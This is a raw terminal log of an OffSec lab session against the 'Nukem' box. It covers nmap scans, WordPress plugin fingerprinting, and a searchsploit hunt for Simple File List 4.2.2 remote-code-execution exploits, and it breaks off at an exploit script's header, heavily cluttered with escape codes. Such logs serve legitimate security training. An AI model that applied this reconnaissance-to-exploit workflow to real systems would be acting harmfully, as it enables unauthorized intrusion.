@@ -1,0 +1,983 @@
+
+=== SESSION START: 2026-08-27 15:09:38 | Box: Nukem | IP: 192.168.183.105 | Platform: Offsec ===
+
+$ [15:09:41] htblog
+
+=== OUTPUT CAPTURE START: 2026-08-27 15:09:41 ===
+
+$ [15:10:26] sudo nmap -p- --min-rate 10000 -oN allports.nmap $BoxIP
+
+$ [15:11:03] sudo nmap -sV -sC -p 22,80,3306,5000,13000,36445 -oN services.nmap $BoxIP
+
+$ [15:14:27] curl -s http://$BoxIP/ | grep -i "wordpress\|version\|generator"
+Script started on 2026-08-27 15:09:41+01:00 [COMMAND="zsh -i" TERM="xterm-256color" TTY="/dev/pts/5" COLUMNS="238" LINES="55"]
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:09:41][39m $ [K[?1h=[?2004hsudo nmap -p- --min-rate 10000 -oN allports.nmap $BoxIP[55D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [32mn[32mm[32ma[32mp[39m[46C[?1l>[?2004l
+[sudo] password for kali: 
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 15:10 +0100
+Nmap scan report for 192.168.183.105
+Host is up (0.016s latency).
+Not shown: 65529 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+3306/tcp  open  mysql
+5000/tcp  open  upnp
+13000/tcp open  unknown
+36445/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 13.92 seconds
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:10:42][39m $ [K[?1h=[?2004hsudo nmap -sV -sC -p 22,80,3306,5000,13000,36445 -oN services.nmap $BoxIP[73D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [32mn[32mm[32ma[32mp[39m[64C[?1l>[?2004l
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 15:11 +0100
+Nmap scan report for 192.168.183.105
+Host is up (0.020s latency).
+
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 8.3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 3e:6a:f5:d3:30:08:7a:ec:38:28:a0:88:4d:75:da:19 (RSA)
+|   256 43:3b:b5:bf:93:86:68:e9:d5:75:9c:7d:26:94:55:81 (ECDSA)
+|_  256 e3:f7:1c:ae:cd:91:c1:28:a3:3a:5b:f6:3e:da:3f:58 (ED25519)
+80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
+|_http-title: Retro Gamming &#8211; Just another WordPress site
+|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
+|_http-generator: WordPress 5.5.1
+3306/tcp  open  mysql       MariaDB 10.3.24 or later (unauthorized)
+5000/tcp  open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)
+|_http-server-header: Werkzeug/1.0.1 Python/3.8.5
+|_http-title: 404 Not Found
+13000/tcp open  http        nginx 1.18.0
+|_http-title: Login V14
+|_http-server-header: nginx/1.18.0
+36445/tcp open  netbios-ssn Samba smbd 4
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 60.85 seconds
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:12:04][39m $ [K[?1h=[?2004hcurl -s http://$BoxIP/ | grep -i "wordpress\|version\|generator"[64D[32mc[32mu[32mr[32ml[39m[21C[32mg[32mr[32me[32mp[39m[4C[33m"[33mw[33mo[33mr[33md[33mp[33mr[33me[33ms[33ms[33m\[33m|[33mv[33me[33mr[33ms[33mi[33mo[33mn[33m\[33m|[33mg[33me[33mn[33me[33mr[33ma[33mt[33mo[33mr[33m"[39m[?1l>[?2004l
+<title>Retro Gamming &#8211; Just another WordPress site</title>
+<meta name="generator" content="WordPress 5.5.1" />
+<meta name="generator" content="TutorLMS 1.5.3" />
+							<p class="site-description">Just another WordPress site</p>
+		</section><section id="recent-comments-2" class="widget widget_recent_comments"><h4 class="widget-title">Recent Comments</h4><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link"><a href='https://wordpress.org/' rel='external nofollow ugc' class='url'>A WordPress Commenter</a></span> on <a href="/index.php/2020/09/28/hello-world/#comment-1">Careers in Game Development</a></li></ul></section><section id="archives-2" class="widget widget_archive"><h4 class="widget-title">Archives</h4>
+			<li><a href="https://wordpress.org/">WordPress.org</a></li>
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:14:28][39m $ [K[?1h=[?2004hcurl -s http://$BoxIP/ | grep -i "wordpress\|version\|generator"[64D[32mc[32mu[32mr[32ml[39m[21C[32mg[32mr[32me[32mp[39m[4C[33m"[33mw[33mo[33mr[33md[33mp[33mr[33me[33ms[33ms[33m\[33m|[33mv[33me[33mr[33ms[33mi[33mo[33mn[33m\[33m|[33mg[33me[33mn[33me[33mr[33ma[33mt[33mo[33mr[33m"[39m[33mr[39m[39m [90m"[39m[33mo[39m[39m [39m [90mr"[39m[33mt[39m[39m [39m [39m [90mor"[39m[33ma[39m[39m [39m [39m [39m [90mtor"[39m[33mr[39m[39m [39m [39m [39m [39m [90mator"[39m[33me[39m[39m [39m [39m [39m [39m [39m [90mrator"[39m[33mn[39m[39m [39m [39m [39m [39m [39m [39m [90merator"[39m[33me[39m[39m [39m [39m [39m [39m [39m [39m [39m [8D[90mnerator"[39m[8D[33mg[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [9D[90menerator"[39m[9D[33m|[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [10D[90mgenerator"[39m[10D[33m\[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [11D[36m\[39m[36m\[90m|[39m[90mgenerator"[39m[11D[33mn[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [12D[90m\|generator"[39m[12D[33mo[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [13D[90mn\|generator"[39m[13D[33mi[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [14D[90mon\|generator"[39m[14D[33ms[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [15D[90mion\|generator"[39m[15D[33mr[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [16D[90msion\|generator"[39m[16D[33me[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [17D[90mrsion\|generator"[39m[17D[33mv[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [18D[90mersion\|generator"[39m[18D[33m|[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [19D[90mversion\|generator"[39m[19D[33m\[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [20D[36m\[39m[36m\[90m|[39m[90mversion\|generator"[39m[20D[33ms[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [21D[90m\|version\|generator"[39m[21D[33ms[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [22D[90ms\|version\|generator"[39m[22D[33me[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [23D[90mss\|version\|generator"[39m[23D[33mr[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [24D[90mess\|version\|generator"[39m[24D[33mp[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [25D[90mress\|version\|generator"[39m[25D[33md[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [26D[90mpress\|version\|generator"[39m[26D[33mr[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [27D[90mdpress\|version\|generator"[39m[27D[33mo[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [28D[90mrdpress\|version\|generator"[39m[28D[33mw[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [29D[90mordpress\|version\|generator"[39m[29D[33m"[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [30D[90mwordpress\|version\|generator"[39m[30D[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [31D[90m"wordpress\|version\|generator"[39m[31D[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [32D[90m "wordpress\|version\|generator"[39m[32D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [33D[90mi "wordpress\|version\|generator"[39m[33D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [34D[90m-i "wordpress\|version\|generator"[39m[34D[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [35D[90m -i "wordpress\|version\|generator"[39m[35D[32me[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [36D[1m[31mg[1m[31mr[1m[31me[0m[39m[90mp -i "wordpress\|version\|generator"[39m[36D[1m[31mr[0m[39m[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [37D[90mep -i "wordpress\|version\|generator"[39m[37D[1m[31mg[0m[39m[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [38D[90mrep -i "wordpress\|version\|generator"[39m[38D[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39D[90mgrep -i "wordpress\|version\|generator"[39m[39D[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [40D[90m grep -i "wordpress\|version\|generator"[39m[40D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [41D[90m| grep -i "wordpress\|version\|generator"[39m[41D[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [42D[90m | grep -i "wordpress\|version\|generator"[39m[42D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [43D[90m/ | grep -i "wordpress\|version\|generator"[39m[43D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [44D[90mP/ | grep -i "wordpress\|version\|generator"[39m[44D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [45D[90mIP/ | grep -i "wordpress\|version\|generator"[39m[45D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [46D[90mxIP/ | grep -i "wordpress\|version\|generator"[39m[46D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [47D[90moxIP/ | grep -i "wordpress\|version\|generator"[39m[47D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [48D[90mBoxIP/ | grep -i "wordpress\|version\|generator"[39m[48D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [49D[90m$BoxIP/ | grep -i "wordpress\|version\|generator"[39m[49D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [50D[90m/$BoxIP/ | grep -i "wordpress\|version\|generator"[39m[50D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [51D[90m//$BoxIP/ | grep -i "wordpress\|version\|generator"[39m[51D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [52D[90m://$BoxIP/ | grep -i "wordpress\|version\|generator"[39m[52D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [53D[90mp://$BoxIP/ | grep -i "wordpress\|version\|generator"[39m[53D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [54D[90mtp://$BoxIP/ | grep -i "wordpress\|version\|generator"[39m[54D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [55D[90mttp://$BoxIP/ | grep -i "wordpress\|version\|generator"[39m[55D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [56D[90mhttp://$BoxIP/ | grep -i "wordpress\|version\|generator"[39m[56D[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [57D[90m http://$BoxIP/ | grep -i "wordpress\|version\|generator"[39m[57D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [58D[90ms http://$BoxIP/ | grep -i "wordpress\|version\|generator"[39m[58D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [59D[90m-s http://$BoxIP/ | grep -i "wordpress\|version\|generator"[39m[59D[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [60D[90m -s http://$BoxIP/ | grep -i "wordpress\|version\|generator"[39m[60D[32mr[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [61D[1m[31mc[1m[31mu[1m[31mr[0m[39m[90ml -s http://$BoxIP/ | grep -i "wordpress\|version\|generator"[39m[61D[1m[31mc[1m[31mu[0m[39m[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [62D[90mrl -s http://$BoxIP/ 
+$ [15:16:19] curl -s http://$BoxIP/ | grep -i "plugins"
+| grep -i "wordpress\|version\|generator"[39m[62D[1m[31mc[0m[39m[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [63D[1m[31mc[0m[39m[90murl -s http://$BoxIP/ | grep -i "wordpress\|version\|generator"[39m[63D[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [64Dcurl -s http://$BoxIP/ | grep -i "plugins"[42D[32mc[32mu[32mr[32ml[39m[21C[32mg[32mr[32me[32mp[39m[4C[33m"[33mp[33ml[33mu[33mg[33mi[33mn[33ms[33m"[39m[?1l>[?2004l
+<link rel='stylesheet' id='ee-simple-file-list-css-css'  href='/wp-content/plugins/simple-file-list/css/eeStyles.css?ver=5' type='text/css' media='all' />
+<link rel='stylesheet' id='tutor-icon-css'  href='/wp-content/plugins/tutor/assets/icons/css/tutor-icon.css?ver=1.5.3' type='text/css' media='all' />
+<link rel='stylesheet' id='tutor-plyr-css'  href='/wp-content/plugins/tutor/assets/packages/plyr/plyr.css?ver=1.5.3' type='text/css' media='all' />
+<link rel='stylesheet' id='tutor-frontend-css'  href='/wp-content/plugins/tutor/assets/css/tutor-front.min.css?ver=1.5.3' type='text/css' media='all' />
+<script type='text/javascript' src='/wp-content/plugins/simple-file-list/js/ee-head.js?ver=5' id='ee-simple-file-list-js-head-js'></script>
+<script type='text/javascript' src='/wp-content/plugins/simple-file-list/js/ee-footer.js?ver=5' id='ee-simple-file-list-js-foot-js'></script>
+<script type='text/javascript' src='/wp-content/plugins/tutor/assets/packages/plyr/plyr.polyfilled.min.js?ver=1.5.3' id='tutor-plyr-js'></script>
+<script type='text/javascript' src='/wp-content/plugins/tutor/assets/packages/SocialShare/SocialShare.min.js?ver=1.5.3' id='tutor-social-share-js'></script>
+<script type='text/javascript' src='/wp-content/plugins/tutor/assets/js/tutor.js?ver=1.5.3' id='tutor-main-js'></script>
+var _tutorobject = {"ajaxurl":"\/wp-admin\/admin-ajax.php","nonce_key":"_wpnonce","_wpnonce":"d7efb567e6","options":{"pagination_per_page":"20","load_tutor_css":"1","load_tutor_js":"1","course_allow_upload_private_files":"1","display_course_instructors":"1","enable_q_and_a_on_course":"1","courses_col_per_row":"3","courses_per_page":"3","lesson_permalink_base":"lesson","quiz_time_limit":{"value":"0","time":"minutes"},"quiz_when_time_expires":"autosubmit","quiz_attempts_allowed":"10","quiz_grade_method":"highest_grade","enable_public_profile":"1","email_to_students":{"quiz_completed":"1","completed_course":"1"},"email_to_instructors":{"a_student_enrolled_in_course":"1","a_student_completed_course":"1","a_student_completed_lesson":"1","a_student_placed_question":"1"},"email_from_name":"Retro Gamming","email_from_address":"admin@local.host","email_footer_text":"","tutor_dashboard_page_id":5,"student_register_page":6,"instructor_register_page":7},"placeholder_img_src":"\/wp-content\/plugins\/tutor\/assets\/images\/placeholder.jpg","enable_lesson_classic_editor":"","text":{"assignment_text_validation_msg":"Assignment answer can not be empty"}};
+<script type='text/javascript' src='/wp-content/plugins/tutor/assets/js/tutor-front.js?ver=1.5.3' id='tutor-frontend-js'></script>
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15
+$ [15:21:50] curl -s http://$BoxIP/wp-content/plugins/simple-file-list/readme.txt | head -20
+
+$ [15:23:01] searchsploit simple file list
+:16:21][39m $ [K[?1h=[?2004hcurl -s http://$BoxIP/wp-content/plugins/simple-file-list/readme.txt | head -20[79D[32mc[32mu[32mr[32ml[39m[67C[32mh[32me[32ma[32md[39m[4C[?1l>[?2004l
+=== Simple File List ===
+Contributors: eemitch
+Donate link: http://simplefilelist.com/donations/simple-file-list-project/
+Tags: file sharing, file list, file uploader, upload files, share files, exchange files, host files, sort files, dropbox, ftp
+Requires at least: 4.0
+Tested up to: 5.4
+Stable tag: 4.2.2
+License: GPLv2 or later
+License URI: http://www.gnu.org/licenses/gpl-2.0.html
+
+Simple File List gives your WordPress website a list of your files which allows your users to open and download them.
+
+== Description ==
+
+Simple File List is a free plugin that gives your WordPress website a list of your files allowing your users to open and download them. Users can also upload files if you choose.
+
+Simple File List is also an alternative to using FTP or Dropbox for larger files. There's no need to deal with Dropbox or FTP usernames and passwords anymore! Everything is on your Wordpress website.
+
+* Manage your files and the list settings from the Admin List.
+* Complete settings for: list display and performance, file uploading restrictions, upload notifications and additional functionality options. 
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:21:51][39m $ [K[?1h=[?2004hsearchsploit simple file list[29D[32ms[32me[32ma[32mr[32mc[32mh[32ms[32mp[32ml[32mo[32mi[32mt[39m[17C[?1l>[?2004l
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                                                                                              |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Joomla! Component mod_[01;31m[Ksimple[m[K[01;31m[KFile[m[K[01;31m[KList[m[Ker 1.0 - Directory Traversal                                                                                                                                            | php/webapps/17736.txt
+[01;31m[KSimple[m[K Directory [01;31m[KList[m[King 2 - Cross-Site Arbitrary [01;31m[KFile[m[K Upload                                                                                                                                               | php/webapps/7383.txt
+[01;31m[KSimple[m[K [01;31m[KFile[m[K [01;31m[KList[m[K WordPress Plugin 4.2.2 - [01;31m[KFile[m[K Upload to RCE                                                                                                                                                | multiple/webapps/52371.py
+WordPress Plugin [01;31m[KSimple[m[K [01;31m[KFile[m[K [01;31m[KList[m[K 4.2.2 - Arbitrary [01;31m[KFile[m[K Upload                                                                                                                                             | php/webapps/48979.py
+WordPress Plugin [01;31m[KSimple[m[K [01;31m[KFile[m[K [01;31m[KList[m[K 4.2.2 - Remote Code Execution                                                                                                                                             | php/webapps/48449.py
+----------------------------------------------------------------------------------------------------------------------------
+$ [15:25:09] searchsploit -p 52371
+
+$ [15:25:22] cp /usr/share/exploitdb/exploits/multiple/webapps/52371.py exploits/
+
+$ [15:25:28] cat exploits/52371.py
+-------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:23:02][39m $ [K[?1h=[?2004hsearchsploit -p 52371[21D[32ms[32me[32ma[32mr[32mc[32mh[32ms[32mp[32ml[32mo[32mi[32mt[39m[9C[?1l>[?2004l
+  Exploit: Simple File List WordPress Plugin 4.2.2 - File Upload to RCE
+      URL: https://www.exploit-db.com/exploits/52371
+     Path: /usr/share/exploitdb/exploits/multiple/webapps/52371.py
+    Codes: CVE-2020-36847
+ Verified: False
+File Type: Python script, ASCII text executable
+Copied EDB-ID #52371's path to the clipboard
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:25:10][39m $ [K[?1h=[?2004hcp /usr/share/exploitdb/exploits/multiple/webapps/52371.py exploits/[68D[32mc[32mp[39m [4m/[4mu[4ms[4mr[4m/[4ms[4mh[4ma[4mr[4me[4m/[4me[4mx[4mp[4ml[4mo[4mi[4mt[4md[4mb[4m/[4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[4mm[4mu[4ml[4mt[4mi[4mp[4ml[4me[4m/[4mw[4me[4mb[4ma[4mp[4mp[4ms[4m/[4m5[4m2[4m3[4m7[4m1[4m.[4mp[4my[24m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[24m[?1l>[?2004l
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:25:22][39m $ [K[?1h=[?2004hcat exploits/52371.py[21D[32mc[32ma[32mt[39m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[4m5[4m2[4m3[4m7[4m1[4m.[4mp[4my[24m[?1l>[?2004l
+# Exploit Title: Simple File List WordPress Plugin 4.2.2 - File Upload to RCE
+# Google Dork: inurl:/wp-content/plugins/simple-file-list/
+# Date: 2025-07-15
+# Exploit Author: Md Amanat Ullah (xSwads)
+# Vendor Homepage: https://wordpress.org/plugins/simple-file-list/
+# Software Link:
